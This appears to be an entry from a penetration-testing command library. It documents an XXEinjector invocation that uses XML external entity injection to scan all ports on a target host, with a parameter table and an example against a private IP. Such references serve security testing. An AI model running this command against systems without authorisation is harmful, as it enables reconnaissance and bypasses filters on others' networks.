---
id: 681361d0-b466-4929-918a-847b0010c5db
name: xxeinjector-enumerate-ports
type: command
executor: bash
data: ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt --enumports=all
output: null
created_at: '2023-04-06T03:56:43.973580+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
platforms:
  - Web
tags:
  - xxe
  - port-scan
verified: true
validated: true
---

# xxeinjector-enumerate-ports

## Command

```bash
ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt --enumports=all
```

## Description

Enumerates open ports on the target using XXE to bypass filters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $__HOST | Target host | Yes |
| --file=/tmp/req.txt | Request file | Yes |
| --enumports=all | Scan all ports | Built-in |

## Examples

### Basic Usage

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all
```

## Expected Output

List of unfiltered/open ports.

## Related

- [[procedures/Exploit-XXE-Vulnerability-Using-Multiple-Tools]]
- [[tools/XXEinjector]]
